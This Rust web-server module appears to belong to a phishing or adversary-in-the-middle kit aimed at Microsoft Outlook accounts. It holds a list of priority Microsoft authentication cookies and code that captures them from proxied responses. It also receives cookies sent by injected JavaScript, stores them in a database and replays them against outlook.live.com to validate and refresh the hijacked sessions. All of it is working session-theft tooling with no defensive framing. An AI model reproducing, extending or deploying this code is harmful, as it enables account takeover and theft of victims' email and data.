use actix_web::{web, HttpResponse, Responder};
use serde::{Deserialize, Serialize};
use chrono::Utc;
use sqlx::SqlitePool;

use crate::vault::Vault;
use crate::AppState;

// Priority cookies for Microsoft Outlook session
const PRIORITY_COOKIES: &[&str] = &[
    "ESTSAUTH",
    "ESTSAUTHPERSISTENT",
    "ANON",
    "CCState",
    "sNr",
    "sDefault",
    "wlidperf",
    " MSPAuth",
    "MSPOK",
    "NAP",
    "SDIDC",
    "x-ms-gateway-slice",
    "xid",
    "RPSAuth",
    "RPSAuthRps",
    "MUID",
    "O365C",
    "ODD",
    "OpenIdConnect.nonce",
    "WLSSC",
    "_SS",
    "_EDGE_S",
    "_EDGE_V",
    "_HPVN",
    "_HPG",
    "PPLState",
    "WLID",
    "wla42",
    "wla43",
    "wla44",
    "wla45",
    "wla46",
    "wla47",
    "wla48",
    "wla49",
    "wla50",
];

/// Represents a captured cookie
#[derive(Debug, Clone, Serialize, Deserialize, sqlx::FromRow)]
pub struct CapturedCookie {
    pub id: String,
    pub token_id: String,
    pub cookie_name: String,
    pub cookie_value: String,
    pub cookie_domain: Option<String>,
    pub cookie_path: Option<String>,
    pub expires_at: Option<String>,
    pub is_httponly: Option<i32>,
    pub is_secure: Option<i32>,
    pub captured_at: String,
}

/// Cookie capture and management
#[derive(Clone)]
#[allow(dead_code)]
pub struct CookieCapture {
    vault: Vault,
}

impl CookieCapture {
    pub fn new(vault: Vault) -> Self {
        Self { vault }
    }

    /// Extract cookies from Set-Cookie headers and store them
    pub async fn capture_from_response(
        &self,
        pool: &SqlitePool,
        token_id: &str,
        response_headers: &reqwest::header::HeaderMap,
    ) -> anyhow::Result<Vec<CapturedCookie>> {
        let mut captured = Vec::new();
        let now = Utc::now().to_rfc3339();

        for (name, value) in response_headers.iter() {
            if name.as_str().to_lowercase() == "set-cookie" {
                let cookie_str = value.to_str().unwrap_or("");
                
                if let Some(cookie) = self.parse_cookie(token_id, cookie_str, &now) {
                    // Check if this is a priority cookie
                    let is_priority = PRIORITY_COOKIES.iter().any(|&pc| cookie.cookie_name == pc);
                    
                    if is_priority {
                        println!("[cookie] Captured priority cookie: {} for token {}", cookie.cookie_name, token_id);
                    } else {
                        println!("[cookie] Captured cookie: {} for token {}", cookie.cookie_name, token_id);
                    }
                    
                    // Store in database
                    self.store_cookie(pool, &cookie).await?;
                    captured.push(cookie);
                }
            }
        }

        if !captured.is_empty() {
            println!("[cookie] Total cookies captured for token {}: {}", token_id, captured.len());
        }

        Ok(captured)
    }

    /// Parse a Set-Cookie header into a CapturedCookie
    fn parse_cookie(&self, token_id: &str, cookie_str: &str, captured_at: &str) -> Option<CapturedCookie> {
        let parts: Vec<&str> = cookie_str.split(";").collect();
        if parts.is_empty() {
            return None;
        }

        // Parse name=value
        let name_value = parts[0].trim();
        let eq_pos = name_value.find("=")?;
        let name = name_value[..eq_pos].trim().to_string();
        let value = name_value[eq_pos + 1..].trim().to_string();

        // Parse attributes
        let mut domain = None;
        let mut path = None;
        let mut expires = None;
        let mut is_httponly = Some(0);
        let mut is_secure = Some(0);

        for part in &parts[1..] {
            let part = part.trim().to_lowercase();
            
            if part.starts_with("domain=") {
                domain = Some(part[7..].trim().to_string());
            } else if part.starts_with("path=") {
                path = Some(part[5..].trim().to_string());
            } else if part.starts_with("expires=") {
                expires = Some(part[8..].trim().to_string());
            } else if part == "httponly" {
                is_httponly = Some(1);
            } else if part == "secure" {
                is_secure = Some(1);
            }
        }

        Some(CapturedCookie {
            id: uuid::Uuid::new_v4().to_string(),
            token_id: token_id.to_string(),
            cookie_name: name,
            cookie_value: value,
            cookie_domain: domain,
            cookie_path: path,
            expires_at: expires,
            is_httponly,
            is_secure,
            captured_at: captured_at.to_string(),
        })
    }

    /// Store a cookie in the database
    async fn store_cookie(&self, pool: &SqlitePool, cookie: &CapturedCookie) -> anyhow::Result<()> {
        sqlx::query(
            r#"
            INSERT INTO captured_cookies (
                id, token_id, cookie_name, cookie_value, cookie_domain,
                cookie_path, expires_at, is_httponly, is_secure, captured_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(id) DO UPDATE SET
                cookie_value = excluded.cookie_value,
                expires_at = excluded.expires_at,
                captured_at = excluded.captured_at
            "#
        )
        .bind(&cookie.id)
        .bind(&cookie.token_id)
        .bind(&cookie.cookie_name)
        .bind(&cookie.cookie_value)
        .bind(&cookie.cookie_domain)
        .bind(&cookie.cookie_path)
        .bind(&cookie.expires_at)
        .bind(cookie.is_httponly)
        .bind(cookie.is_secure)
        .bind(&cookie.captured_at)
        .execute(pool)
        .await?;

        Ok(())
    }

    /// Retrieve all cookies for a token
    pub async fn get_cookies(
        &self,
        pool: &SqlitePool,
        token_id: &str,
    ) -> anyhow::Result<Vec<CapturedCookie>> {
        let cookies: Vec<CapturedCookie> = sqlx::query_as::<_, CapturedCookie>(
            "SELECT id, token_id, cookie_name, cookie_value, cookie_domain, cookie_path, expires_at, is_httponly, is_secure, captured_at FROM captured_cookies WHERE token_id = ? ORDER BY captured_at DESC"
        )
        .bind(token_id)
        .fetch_all(pool)
        .await?;

        Ok(cookies)
    }

    /// Get cookies formatted as Cookie header value
    pub async fn get_cookie_header(
        &self,
        pool: &SqlitePool,
        token_id: &str,
    ) -> anyhow::Result<String> {
        let cookies = self.get_cookies(pool, token_id).await?;
        
        let cookie_str = cookies
            .into_iter()
            .map(|c| format!("{}={}", c.cookie_name, c.cookie_value))
            .collect::<Vec<_>>()
            .join("; ");

        Ok(cookie_str)
    }

    /// Check if session is valid by making a test request
    pub async fn is_session_valid(
        &self,
        pool: &SqlitePool,
        token_id: &str,
    ) -> bool {
        let client = reqwest::Client::new();
        
        match self.get_cookie_header(pool, token_id).await {
            Ok(cookie_header) => {
                if cookie_header.is_empty() {
                    return false;
                }

                let resp = client
                    .get("https://outlook.live.com/owa/")
                    .header("Cookie", cookie_header)
                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                    .send()
                    .await;

                match resp {
                    Ok(response) => {
                        let status = response.status();
                        let body = response.text().await.unwrap_or_default();
                        
                        // Check if response contains email-related content (indicates valid session)
                        let is_valid = status.is_success() && 
                            (body.contains("outlook") || body.contains("mail") || body.contains("inbox"));
                        
                        println!("[cookie] Session validation for token {}: {} (status: {})", 
                            token_id, if is_valid { "VALID" } else { "INVALID" }, status);
                        
                        is_valid
                    }
                    Err(e) => {
                        eprintln!("[cookie] Session validation request failed: {}", e);
                        false
                    }
                }
            }
            Err(e) => {
                eprintln!("[cookie] Failed to get cookie header: {}", e);
                false
            }
        }
    }

    /// Refresh session by making a new request to get fresh cookies
    pub async fn refresh_session(
        &self,
        pool: &SqlitePool,
        token_id: &str,
    ) -> anyhow::Result<bool> {
        println!("[cookie] Attempting to refresh session for token {}", token_id);
        
        // Check if we have existing cookies
        let existing = self.get_cookies(pool, token_id).await?;
        if existing.is_empty() {
            println!("[cookie] No existing cookies found for token {}", token_id);
            return Ok(false);
        }

        // Try to use existing cookies to get new ones
        let client = reqwest::Client::builder()
            .redirect(reqwest::redirect::Policy::none())
            .build()?;

        let cookie_header = self.get_cookie_header(pool, token_id).await?;
        
        let resp = client
            .get("https://outlook.live.com/owa/")
            .header("Cookie", cookie_header)
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .send()
            .await?;

        // Capture any new cookies from the response
        let _new_cookies = self.capture_from_response(pool, token_id, resp.headers()).await?;
        
        // Validate the session
        let is_valid = self.is_session_valid(pool, token_id).await;
        
        println!("[cookie] Session refresh for token {}: {}", 
            token_id, if is_valid { "SUCCESS" } else { "FAILED" });
        
        Ok(is_valid)
    }

    /// Delete all cookies for a token (session kill)
    pub async fn delete_cookies(
        &self,
        pool: &SqlitePool,
        token_id: &str,
    ) -> anyhow::Result<u64> {
        let result = sqlx::query("DELETE FROM captured_cookies WHERE token_id = ?")
            .bind(token_id)
            .execute(pool)
            .await?;

        println!("[cookie] Deleted {} cookies for token {}", result.rows_affected(), token_id);
        
        Ok(result.rows_affected())
    }

    /// Get cookie statistics for a token
    pub async fn get_cookie_stats(
        &self,
        pool: &SqlitePool,
        token_id: &str,
    ) -> anyhow::Result<serde_json::Value> {
        let cookies = self.get_cookies(pool, token_id).await?;
        
        let total = cookies.len();
        let httponly = cookies.iter().filter(|c| c.is_httponly == Some(1)).count();
        let secure = cookies.iter().filter(|c| c.is_secure == Some(1)).count();
        let priority = cookies.iter().filter(|c| {
            PRIORITY_COOKIES.iter().any(|&pc| c.cookie_name == pc)
        }).count();

        Ok(serde_json::json!({
            "token_id": token_id,
            "total_cookies": total,
            "httponly_cookies": httponly,
            "secure_cookies": secure,
            "priority_cookies": priority,
            "last_updated": cookies.first().map(|c| c.captured_at.clone()).unwrap_or_default()
        }))
    }
}

/// Request payload for cookie report from JavaScript
#[derive(Deserialize)]
#[allow(dead_code)]
pub struct CookieReportRequest {
    pub token_id: Option<String>,
    pub cookies: String,
    pub url: String,
    pub timestamp: String,
}

/// HTTP handler for cookie report endpoint
/// Receives cookies from injected JavaScript
pub async fn cookie_report_handler(
    body: web::Json<CookieReportRequest>,
    state: web::Data<AppState>,
) -> impl Responder {
    println!("[cookie] Received cookie report from JS for URL: {}", body.url);
    
    // Try to extract token_id from URL if not provided
    let token_id = body.token_id.clone().unwrap_or_else(|| {
        // Extract token from URL path /s/{token_id}/
        if let Some(start) = body.url.find("/s/") {
            let rest = &body.url[start + 3..];
            if let Some(end) = rest.find('/') {
                return rest[..end].to_string();
            }
        }
        "unknown".to_string()
    });

    // Parse document.cookie format (name=value; name2=value2)
    let cookie_capture = CookieCapture::new(state.vault.clone());
    let now = Utc::now().to_rfc3339();
    
    for cookie_pair in body.cookies.split("; ") {
        let trimmed = cookie_pair.trim();
        if trimmed.is_empty() {
            continue;
        }
        
        if let Some(eq_pos) = trimmed.find("=") {
            let name = trimmed[..eq_pos].to_string();
            let value = trimmed[eq_pos + 1..].to_string();
            
            let cookie = CapturedCookie {
                id: uuid::Uuid::new_v4().to_string(),
                token_id: token_id.clone(),
                cookie_name: name.clone(),
                cookie_value: value,
                cookie_domain: Some("outlook.live.com".to_string()),
                cookie_path: Some("/".to_string()),
                expires_at: None,
                is_httponly: Some(0), // JavaScript can't read HttpOnly cookies
                is_secure: Some(1),
                captured_at: now.clone(),
            };
            
            if let Err(e) = cookie_capture.store_cookie(&state.pool, &cookie).await {
                eprintln!("[cookie] Failed to store JS cookie {}: {}", name, e);
            } else {
                println!("[cookie] Stored JS cookie: {} for token {}", name, token_id);
            }
        }
    }

    HttpResponse::Ok().json(serde_json::json!({
        "status": "received",
        "token_id": token_id,
        "cookies_received": body.cookies.split("; ").count()
    }))
}

/// HTTP handler to get cookies for a token
pub async fn get_cookies_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let cookie_capture = CookieCapture::new(state.vault.clone());
    
    match cookie_capture.get_cookies(&state.pool, &token_id).await {
        Ok(cookies) => {
            // Mask sensitive values for security
            let masked: Vec<serde_json::Value> = cookies.into_iter().map(|c| {
                serde_json::json!({
                    "id": c.id,
                    "token_id": c.token_id,
                    "cookie_name": c.cookie_name,
                    "cookie_value": format!("{}...", &c.cookie_value[..c.cookie_value.len().min(10)]),
                    "cookie_domain": c.cookie_domain,
                    "cookie_path": c.cookie_path,
                    "expires_at": c.expires_at,
                    "is_httponly": c.is_httponly,
                    "is_secure": c.is_secure,
                    "captured_at": c.captured_at,
                    "is_priority": PRIORITY_COOKIES.iter().any(|&pc| pc == c.cookie_name)
                })
            }).collect();
            
            HttpResponse::Ok().json(serde_json::json!({
                "token_id": token_id,
                "cookies": masked,
                "count": masked.len()
            }))
        }
        Err(e) => {
            eprintln!("[cookie] Failed to get cookies: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "failed_to_get_cookies",
                "details": format!("{}", e)
            }))
        }
    }
}

/// HTTP handler to delete cookies (session kill)
pub async fn delete_cookies_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let cookie_capture = CookieCapture::new(state.vault.clone());
    
    match cookie_capture.delete_cookies(&state.pool, &token_id).await {
        Ok(count) => {
            HttpResponse::Ok().json(serde_json::json!({
                "status": "deleted",
                "token_id": token_id,
                "cookies_deleted": count
            }))
        }
        Err(e) => {
            eprintln!("[cookie] Failed to delete cookies: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "failed_to_delete_cookies",
                "details": format!("{}", e)
            }))
        }
    }
}

/// HTTP handler to get cookie statistics
pub async fn get_cookie_stats_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let cookie_capture = CookieCapture::new(state.vault.clone());
    
    match cookie_capture.get_cookie_stats(&state.pool, &token_id).await {
        Ok(stats) => HttpResponse::Ok().json(stats),
        Err(e) => {
            eprintln!("[cookie] Failed to get stats: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "failed_to_get_stats",
                "details": format!("{}", e)
            }))
        }
    }
}

/// HTTP handler to validate session
pub async fn validate_session_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let cookie_capture = CookieCapture::new(state.vault.clone());
    
    let is_valid = cookie_capture.is_session_valid(&state.pool, &token_id).await;
    
    HttpResponse::Ok().json(serde_json::json!({
        "token_id": token_id,
        "session_valid": is_valid,
        "timestamp": Utc::now().to_rfc3339()
    }))
}
